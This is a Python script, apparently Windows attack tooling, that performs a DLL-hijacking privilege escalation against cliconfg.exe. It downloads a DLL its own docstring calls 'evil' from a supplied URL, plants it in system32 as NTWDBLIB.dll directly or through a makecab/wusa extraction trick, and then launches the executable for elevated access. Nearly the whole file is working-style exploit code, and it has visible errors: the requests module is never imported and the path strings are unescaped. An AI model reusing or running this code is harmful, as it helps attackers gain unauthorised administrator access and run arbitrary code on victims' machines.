"""
https://www.greyhathacker.net/?p=796

Under development, untested code but should work.
	
Checks if cliconfg.exe is present in \system32\ folder, if True
continue by checking if the dll file exists. If false, continue
by attempting to download the evil dll file to \system32\ folder
if fail, we attempt to use makecab and wusa to copy our dll. After
the copy is done, we execute the executable and enjoys the elevated
access
"""
import os
import sys
import win32api
import win32con

def cliconfig_dll_hijack(url):
	if (os.path.isfile(os.path.join("c:\windows\system32\cliconfg.exe")) == True):
		if (os.path.isfile(os.path.join("c:\windows\system32\NTWDBLIB.dll")) == False):
			try:
				download = requests.get(url)
				if (len(download.content) > 1):
					with open(os.path.join("c:\windows\system32\NTWDBLIB.dll"),"wb") as dll:
						dll.write(download.content)
						dll.close()
					if (os.path.isfile(os.path.join("c:\windows\system32\NTWDBLIB.dll")) == True):
						try:
							win32api.ShellExecute(0,None,"c:\windows\system32\cliconfg.exe",None,None,win32con.SW_SHOW)
						except Exception as error:
							return False
					else:
						return False
				else:
					return False
			except Exception as error:
				try:
					makecab = os.popen("makecab NTWDBLIB.dll NTWDBLIB.tmp")
				except Exception as error:
					return False	
				try:
					wusa = os.popen("wusa NTWDBLIB.tmp /extract:c:\windows\system32")
				except Exception as error:
					return False
				try:
					print os.remove("NTWDBLIB.tmp")
				except Exception as error:
					return False	
			try:
				win32api.ShellExecute(0,None,"c:\windows\system32\cliconfg.exe",None,None,win32con.SW_SHOW)
			except Exception as error:
				return False
	else:
		sys.exit()
